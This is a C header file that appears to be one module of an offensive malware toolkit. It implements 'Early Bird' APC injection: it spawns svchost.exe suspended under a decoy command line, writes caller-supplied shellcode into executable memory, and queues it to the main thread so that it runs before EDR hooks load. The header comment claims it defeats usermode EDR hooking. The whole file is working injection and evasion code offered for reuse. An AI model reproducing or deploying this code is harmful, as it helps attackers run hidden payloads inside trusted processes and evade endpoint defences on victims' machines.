// chunk: evasion/cascade_inject
// depends: (none)
// provides: cascade_inject
// risk: low
// note: Early Bird / cascade injection — uses QueueUserAPC to inject into a
//       suspended process before EDR hooks are loaded. Creates a suspended
//       process (svchost.exe -k netsvcs), allocates + writes payload, queues
//       APC to main thread, resumes. The payload executes during process init
//       before EDR DLLs are mapped. Defeats usermode hooking-based EDRs.

#ifndef CHUNK_CASCADE_INJECT
#define CHUNK_CASCADE_INJECT

#include <windows.h>

typedef NTSTATUS (NTAPI *pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);

/*
 * cascade_inject: Inject and execute payload via Early Bird APC.
 *
 * payload: position-independent code (shellcode)
 * payload_size: size in bytes
 * target_exe: process to spawn suspended (default: svchost.exe)
 *
 * Returns the PID of the spawned process, 0 on failure.
 */
static DWORD cascade_inject(BYTE *payload, SIZE_T payload_size, const char *target_exe) {
    if (!target_exe) target_exe = "C:\\Windows\\System32\\svchost.exe";

    /* Build command line for the decoy process */
    char cmdline[MAX_PATH + 32];
    snprintf(cmdline, sizeof(cmdline), "%s -k netsvcs", target_exe);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    /* Create process in suspended state */
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                         CREATE_SUSPENDED | CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi)) {
        return 0;
    }

    /* Allocate memory in the suspended process */
    PVOID remote_buf = VirtualAllocEx(pi.hProcess, NULL, payload_size,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }

    /* Write payload */
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, remote_buf, payload, payload_size, &written)) {
        VirtualFreeEx(pi.hProcess, remote_buf, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }

    /* Queue APC to the main thread — executes before process init completes */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtQueueApcThread NtQueueApcThread = NULL;
    if (ntdll)
        NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");

    BOOL apc_ok = FALSE;
    if (NtQueueApcThread) {
        NTSTATUS status = NtQueueApcThread(pi.hThread, remote_buf, NULL, NULL, NULL);
        apc_ok = (status == 0);
    }

    if (!apc_ok) {
        /* Fallback to standard QueueUserAPC */
        apc_ok = QueueUserAPC((PAPCFUNC)remote_buf, pi.hThread, 0);
    }

    if (!apc_ok) {
        VirtualFreeEx(pi.hProcess, remote_buf, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }

    /* Resume the thread — APC fires during alertable wait in process init */
    ResumeThread(pi.hThread);

    DWORD pid = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return pid;
}

#endif
